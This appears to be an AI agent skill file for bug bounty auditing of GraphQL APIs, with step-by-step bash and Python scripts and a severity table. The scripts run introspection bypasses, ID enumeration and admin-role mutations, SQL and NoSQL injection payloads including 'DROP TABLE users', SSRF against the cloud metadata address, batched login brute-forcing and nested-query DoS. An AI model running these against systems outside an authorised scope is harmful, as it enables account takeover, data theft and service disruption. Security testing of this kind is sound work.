---
name: graphql-hunter
description: Systematically audit GraphQL APIs for introspection exposure, authorization flaws, injection vulnerabilities, batching attacks, and information disclosure. Use this skill whenever a target exposes a GraphQL endpoint. Trigger on phrases like "test GraphQL", "GraphQL hunting", "GraphQL security", "audit this API", or when recon reveals /graphql, /api/graphql, /gql, /query endpoints, Content-Type: application/graphql responses, or __typename fields in API responses.
---

# GraphQL Hunter Skill

You are auditing a GraphQL API. GraphQL's self-describing nature makes it uniquely attackable — introspection exposes the entire schema, a single endpoint handles all operations, and object relationships create authorization bypass opportunities that REST APIs don't have. Most GraphQL implementations in the wild have at least one of: introspection enabled in production, broken object-level authorization, or batching enabled without rate limiting.

Run all phases. Do not skip Phase 1 — the schema drives every subsequent test.

---

## Phase 1 — Endpoint Discovery and Schema Extraction

### Step 1.1 — Locate GraphQL Endpoints

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/graphql

# Pull from existing recon first
grep -iE '/(graphql|gql|query|graph|api/v[0-9]*/graphql)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/js/endpoints.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/graphql/endpoints.txt

# Probe common GraphQL paths across live hosts
for host in $(head -10 $TARGET_DIR/recon/subdomains/live-hostnames.txt); do
  for path in \
    "/graphql" "/api/graphql" "/gql" "/graph" "/query" \
    "/graphql/v1" "/v1/graphql" "/v2/graphql" "/api/v1/graphql" \
    "/graphiql" "/playground" "/altair" "/explorer" \
    "/api/graph" "/graphql/console" "/graphql/ide"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
      -X POST -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}' \
      "https://$host$path" --max-time 5)
    if [[ "$STATUS" =~ ^(200|400|422)$ ]]; then
      echo "[GRAPHQL:$STATUS] https://$host$path"
    fi
  done
done | tee -a $TARGET_DIR/recon/graphql/endpoints.txt

echo "[*] GraphQL endpoints found:"
cat $TARGET_DIR/recon/graphql/endpoints.txt
```

**Note:** A 400 or 422 on a POST with `{"query":"{__typename}"}` still indicates a GraphQL endpoint — it means the endpoint exists but the query was invalid or rejected.

### Step 1.2 — Introspection Query

Introspection reveals the full schema: all types, fields, arguments, mutations, and subscriptions.

```bash
GQL_URL="[endpoint from Step 1.1]"
SESSION_COOKIE="[auth cookie if required]"

curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"
  }' | python3 -m json.tool > $TARGET_DIR/recon/graphql/schema.json 2>/dev/null

if [ -s $TARGET_DIR/recon/graphql/schema.json ]; then
  echo "[+] Introspection ENABLED — full schema extracted"
  echo "Types found: $(python3 -c "import json; d=json.load(open('$TARGET_DIR/recon/graphql/schema.json')); print(len(d.get('data',{}).get('__schema',{}).get('types',[])))" 2>/dev/null)"
else
  echo "[-] Introspection disabled or requires auth"
fi
```

**If introspection is disabled:** Try bypass techniques in Step 1.3 before giving up.

### Step 1.3 — Introspection Bypass Attempts

Some servers disable introspection via middleware that checks exact query strings but doesn't block variations:

```bash
# Technique 1: __schema via fragments / aliases
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"query": "{ __schema { types { name } } }"}' | head -200

# Technique 2: Whitespace / newline injection into __schema keyword
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d $'{"query": "{ __schema\\u0000 { types { name } } }"}' | head -100

# Technique 3: GET-based introspection (some servers only block POST)
curl -sk -G "$GQL_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  --data-urlencode 'query={ __schema { types { name } } }' | head -200

# Technique 4: __type instead of __schema (field-level introspection)
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"query": "{ __type(name: \\"User\\") { fields { name type { name } } } }"}' | \
  python3 -m json.tool 2>/dev/null
```

### Step 1.4 — Schema Analysis

From the extracted schema, identify high-value targets:

```bash
# Extract all query and mutation names
python3 << 'EOF'
import json, sys

try:
    with open('$TARGET_DIR/recon/graphql/schema.json') as f:
        data = json.load(f)
    schema = data['data']['__schema']
    types = {t['name']: t for t in schema['types'] if not t['name'].startswith('__')}

    query_type = schema.get('queryType', {}).get('name', 'Query')
    mutation_type = schema.get('mutationType', {}).get('name')
    subscription_type = schema.get('subscriptionType', {}).get('name')

    print("=== QUERIES ===")
    if query_type in types and types[query_type]['fields']:
        for f in types[query_type]['fields']:
            args = ', '.join(a['name'] for a in (f['args'] or []))
            print(f"  {f['name']}({args})")

    print("\n=== MUTATIONS ===")
    if mutation_type and mutation_type in types and types[mutation_type]['fields']:
        for f in types[mutation_type]['fields']:
            args = ', '.join(a['name'] for a in (f['args'] or []))
            print(f"  {f['name']}({args})")

    print("\n=== SUBSCRIPTIONS ===")
    if subscription_type and subscription_type in types and types[subscription_type]['fields']:
        for f in types[subscription_type]['fields']:
            print(f"  {f['name']}")

    # Flag sensitive-sounding fields
    print("\n=== SENSITIVE FIELDS (keyword match) ===")
    keywords = ['password','secret','token','key','admin','internal','debug',
                'role','permission','private','ssn','credit','card','email','phone']
    for tname, t in types.items():
        for field in (t.get('fields') or []):
            if any(k in field['name'].lower() for k in keywords):
                print(f"  {tname}.{field['name']}")
except Exception as e:
    print(f"Parse error: {e}")
EOF
```

---

## Phase 2 — Authorization Testing

### Step 2.1 — Unauthenticated Query Access

Test every query without authentication:

```bash
# Try each discovered query without any auth cookie/token
while IFS= read -r QUERY_NAME; do
  RESPONSE=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{$QUERY_NAME}\"}" \
    --max-time 5)
  HTTP_STATUS=$(echo $RESPONSE | python3 -c \
    "import sys,json; d=json.loads(sys.stdin.read()); \
    has_data = 'data' in d and d['data'] is not None; \
    has_errors = bool(d.get('errors')); \
    print('DATA' if has_data else ('AUTH_ERROR' if has_errors else 'EMPTY'))" 2>/dev/null)
  if [ "$HTTP_STATUS" = "DATA" ]; then
    echo "[UNAUTH-DATA] $QUERY_NAME"
    echo $RESPONSE | python3 -m json.tool 2>/dev/null | head -20
  fi
done < <(grep -oP '(?<=  )\w+(?=\()' $TARGET_DIR/recon/graphql/queries.txt 2>/dev/null)
```

### Step 2.2 — BOLA / Object-Level Authorization

GraphQL queries often accept ID arguments directly. Test for BOLA by querying other users' objects:

```bash
# With victim account session, query objects using IDs from attacker account
# Example: user query with cross-account ID
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $VICTIM_SESSION" \
  -d '{
    "query": "{ user(id: \"[attacker-user-id]\") { id email role createdAt } }"
  }' | python3 -m json.tool

# Test numeric ID enumeration
for ID in 1 2 3 100 1000; do
  RESULT=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"query\": \"{user(id: $ID) { id email role }}\"}" \
    --max-time 5)
  echo "[ID:$ID] $(echo $RESULT | python3 -c \
    "import sys,json; d=json.loads(sys.stdin.read()); \
    u=d.get('data',{}).get('user'); print(u if u else 'null')" 2>/dev/null)"
done
```

### Step 2.3 — Field-Level Authorization

Even when a query is authorized, individual fields may not be. Request sensitive fields explicitly:

```bash
# Request privileged fields on an authorized object
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{
    "query": "{ me { id email role permissions internalId adminNotes \
               passwordHash twoFactorSecret apiKey billingInfo { \
               cardLast4 cardExpiry } } }"
  }' | python3 -m json.tool
```

If any sensitive field returns data for a non-admin user → field-level authorization missing.

### Step 2.4 — Mutation Authorization

Test mutations that should be restricted:

```bash
# Attempt admin mutations as a normal user
MUTATIONS=(
  '{ updateUserRole(userId: "[other-user-id]", role: "admin") { id role } }'
  '{ deleteUser(userId: "[other-user-id]") { success } }'
  '{ updateEmail(userId: "[other-user-id]", email: "attacker@evil.com") { id email } }'
  '{ resetPassword(userId: "[other-user-id]") { token } }'
)

for MUTATION in "${MUTATIONS[@]}"; do
  RESULT=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $LOW_PRIV_SESSION" \
    -d "{\"query\": \"mutation $MUTATION\"}" \
    --max-time 5)
  echo "[MUTATION] $(echo $RESULT | python3 -c \
    "import sys,json; d=json.loads(sys.stdin.read()); \
    print('SUCCESS' if d.get('data') else d.get('errors',[{}])[0].get('message','?'))" 2>/dev/null)"
  echo "$MUTATION"
done
```

---

## Phase 3 — Injection Testing

### Step 3.1 — SQL Injection via GraphQL Arguments

```bash
# Test string arguments with SQL injection payloads
SQLI_PAYLOADS=("'" "\"" "1 OR 1=1" "1' OR '1'='1" "'; DROP TABLE users--" "1 UNION SELECT null--")

for PAYLOAD in "${SQLI_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import json; print(json.dumps('$PAYLOAD'))")
  RESULT=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"query\": \"{users(filter: $ENCODED) { id email }}\"}" \
    --max-time 5)
  ERROR=$(echo $RESULT | python3 -c \
    "import sys,json; d=json.loads(sys.stdin.read()); \
    errs=d.get('errors',[]); print(errs[0].get('message','') if errs else '')" 2>/dev/null)
  if echo "$ERROR" | grep -iE '(sql|syntax|query|database|pg_|mysql|sqlite|ora-)' > /dev/null; then
    echo "[SQLI-INDICATOR] payload=$PAYLOAD error=$ERROR"
  fi
done
```

### Step 3.2 — NoSQL Injection (MongoDB backends)

```bash
# NoSQL injection via GraphQL arguments using MongoDB operators
NOSQL_PAYLOADS=(
  '{"$gt": ""}'
  '{"$ne": null}'
  '{"$regex": ".*"}'
  '{"$where": "1==1"}'
)

for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
  RESULT=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"query\": \"{users(filter: $PAYLOAD) { id email }}\"}" \
    --max-time 5)
  DATA=$(echo $RESULT | python3 -c \
    "import sys,json; d=json.loads(sys.stdin.read()); \
    print('DATA' if d.get('data') else 'NO_DATA')" 2>/dev/null)
  echo "[$DATA] $PAYLOAD"
done
```

### Step 3.3 — Server-Side Request Forgery via URL Arguments

```bash
# Find fields that accept URL or path inputs
# Common in: avatar upload URLs, webhook URLs, redirect URIs, file import
python3 -c "
import json
with open('$TARGET_DIR/recon/graphql/schema.json') as f:
    data = json.load(f)
types = data['data']['__schema']['types']
for t in types:
    for field in (t.get('fields') or []) + (t.get('inputFields') or []):
        name = field['name'].lower()
        if any(k in name for k in ['url','uri','link','src','href','path','redirect','webhook','callback','import','fetch']):
            print(f"{t['name']}.{field['name']}")
"
```

For each URL-accepting field, test SSRF:
```bash
# Point URL argument to internal metadata endpoint or Burp Collaborator
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{
    "query": "mutation { updateAvatar(url: \"http://169.254.169.254/latest/meta-data/\") { avatarUrl } }"
  }' | python3 -m json.tool
```

---

## Phase 4 — Batching and DoS

### Step 4.1 — Query Batching

GraphQL supports batching multiple operations in one request. This bypasses per-request rate limits:

```bash
# Test if batching is supported
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '[
    {"query": "{__typename}"},
    {"query": "{__typename}"},
    {"query": "{__typename}"}
  ]' | python3 -m json.tool

# If batch response is an array — batching is enabled
```

**If batching is enabled, test rate limit bypass:**
```bash
# Batch 50 login attempts in a single HTTP request
python3 << 'PYEOF'
import json

batch = [
    {"query": f'mutation {{ login(email: "victim@target.com", password: "attempt{i}") {{ token }} }}'}
    for i in range(50)
]
print(json.dumps(batch))
PYEOF
# Pipe output to curl and observe if all 50 attempts execute without rate limiting
```

### Step 4.2 — Alias-Based Batching Bypass

Even without array batching, aliases allow multiple field calls in one query:

```bash
# 10 login attempts via aliases in a single query
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{
    "query": "mutation { a1: login(email: \"victim@target.com\", password: \"password1\") { token } a2: login(email: \"victim@target.com\", password: \"password2\") { token } a3: login(email: \"victim@target.com\", password: \"password3\") { token } a4: login(email: \"victim@target.com\", password: \"password4\") { token } a5: login(email: \"victim@target.com\", password: \"password5\") { token } }"
  }' | python3 -m json.tool
```

### Step 4.3 — Deeply Nested Query (Complexity DoS)

```bash
# Find a type with a self-referential or cyclic relationship from schema
# (e.g. user -> posts -> author -> posts -> ...)
# Construct a deeply nested query
curl -sk -X POST "$GQL_URL" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{
    "query": "{ user(id: \"1\") { posts { author { posts { author { posts { author { id email } } } } } } } }"
  }' -w "\nTime: %{time_total}s\nSize: %{size_download}b" | tail -3

# If response time is > 5s or size is very large — server lacks query depth/complexity limits
# Note: Do NOT send this repeatedly — document the single instance as evidence
```

---

## Phase 5 — Information Disclosure

### Step 5.1 — Error Message Leakage

```bash
# Send malformed queries to trigger verbose errors
ERROR_TESTS=(
  '{"query": "{ invalidField }"}'
  '{"query": "{ user(id: 1) { nonexistentField } }"}'
  '{"query": "not a valid query"}'
  '{"query": "{ user(id: \"' UNION SELECT 1--\") { id } }"}'
)

for TEST in "${ERROR_TESTS[@]}"; do
  RESULT=$(curl -sk -X POST "$GQL_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "$TEST" --max-time 5)
  echo "=== $TEST ==="
  echo $RESULT | python3 -m json.tool 2>/dev/null | grep -iE '(message|extensions|stack|trace|location|path)'
  echo ""
done
```

**Flag if errors contain:** stack traces, file paths, internal service names, SQL query fragments, version strings, or class/function names.

### Step 5.2 — GraphQL IDE Exposure

```bash
# Check for exposed GraphQL IDEs (GraphiQL, Playground, Altair, Explorer)
for host in $(head -10 $TARGET_DIR/recon/subdomains/live-hostnames.txt); do
  for path in "/graphiql" "/playground" "/altair" "/explorer" \
              "/graphql/console" "/graphql/playground" "/graphql/explorer"; do
    RESPONSE=$(curl -sk -o /tmp/gql-ide-check.html -w "%{http_code}" \
      "https://$host$path" --max-time 5)
    if [ "$RESPONSE" = "200" ] && grep -qiE '(graphiql|playground|graphql ide|altair)' /tmp/gql-ide-check.html; then
      echo "[IDE-EXPOSED] https://$host$path"
    fi
  done
done
```

**Exposed IDE in production = High finding.** It provides a full interactive console to explore and query the API, often without authentication.

### Step 5.3 — Deprecated Field Exposure

```bash
# Extract deprecated fields from schema — they may bypass newer authorization logic
python3 << 'EOF'
import json
with open('$TARGET_DIR/recon/graphql/schema.json') as f:
    data = json.load(f)
types = data['data']['__schema']['types']
for t in types:
    if t['name'].startswith('__'):
        continue
    for field in (t.get('fields') or []):
        if field.get('isDeprecated'):
            print(f"[DEPRECATED] {t['name']}.{field['name']} — {field.get('deprecationReason','')}")
EOF
```

Deprecated fields are often removed from the UI but still resolve server-side. Test each one — they may return data that the current fields restrict.

---

## Output Summary

All output files written to `$TARGET_DIR/recon/graphql/`:

| File | Contents |
|---|---|
| `endpoints.txt` | All discovered GraphQL endpoints with HTTP status |
| `schema.json` | Full introspection result (raw) |
| `queries.txt` | Extracted query names and signatures |
| `mutations.txt` | Extracted mutation names and signatures |
| `sensitive-fields.txt` | Fields matching sensitive keyword patterns |
| `deprecated-fields.txt` | All deprecated fields across the schema |

---

## Severity Reference

| Finding | Severity |
|---|---|
| BOLA via cross-account object query | High–Critical |
| Mutation authorization bypass (role change, account takeover) | Critical |
| SSRF via URL argument field | High–Critical |
| Alias/batch login brute-force bypass | High |
| GraphQL IDE exposed in production | High |
| Introspection enabled in production | Medium |
| Unauthenticated query returning user data | Medium–High |
| Sensitive fields accessible to low-privilege users | Medium–High |
| Deprecated field exposing restricted data | Medium |
| Verbose error messages with stack traces/paths | Low–Medium |
| Query depth/complexity DoS (no limits) | Low–Medium |

---

## Guiding Principles

- **Introspection is a starting point, not a finding.** Every production GraphQL API should disable introspection, but the real value is using the schema to drive authorization tests — that's where Critical findings live.
- **Test every mutation for authorization, not just queries.** Mutations that modify state are almost always higher impact than queries and are often less hardened.
- **Alias-based batching bypass is almost always overlooked.** If the app has per-request rate limiting on login or OTP, test alias batching before concluding it's protected.
- **Deprecated fields are a free win.** They are rarely retested after deprecation and often bypass the authorization logic added to their replacements.
- **Do not send depth/complexity DoS payloads more than once.** A single request is sufficient to demonstrate the absence of query complexity limits. Repeated requests are out of scope.
- **Run /triager before submitting.** Introspection-only findings are Low or Informational. BOLA and mutation authorization bypasses are High/Critical — confirm actual data access before submitting.
